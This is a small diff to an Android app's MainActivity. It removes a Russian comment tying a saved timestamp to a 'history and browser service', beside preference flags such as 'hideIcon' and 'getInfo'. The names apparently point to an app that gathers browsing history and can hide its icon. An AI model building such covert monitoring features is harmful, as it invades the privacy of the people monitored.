@@ -99,12 +99,7 @@ public class MainActivity extends Activity {
 			e.putBoolean("getInfo", true);
 			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время
-																				// для
-																				// сервиса
-																				// истрои
-																				// и
-																				// браузера
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); 
 			e.putString("period", "1"); // period must equal 10 min
 			e.putString("code", "-1");
 			e.commit();
